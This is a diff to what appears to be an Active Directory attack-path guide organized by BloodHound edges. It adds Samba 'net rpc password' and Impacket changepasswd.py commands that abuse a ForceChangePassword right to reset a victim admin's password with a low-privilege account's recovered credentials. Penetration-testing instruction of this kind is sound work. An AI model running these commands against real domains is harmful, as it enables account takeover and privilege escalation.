@@ -134,8 +134,11 @@ Each edge has a documented abuse technique. The BloodHound UI shows you the exac
 
 **ForceChangePassword edge:**
 ```bash
-# pwsafe.py from PowerSploit / Impacket equivalent
+# Samba's net rpc — works from any Linux/WSL with SMB to a DC
 net rpc password "victim_admin" "NewPassword123!" -U contoso/svc_low%RECOVERED -S dc.contoso.local
+
+# Impacket's changepasswd.py — newer SAMR-based equivalent
+changepasswd.py -newpass 'NewPassword123!' contoso/svc_low:RECOVERED@dc.contoso.local -altuser victim_admin
 ```
 
 **GenericAll on a user:**
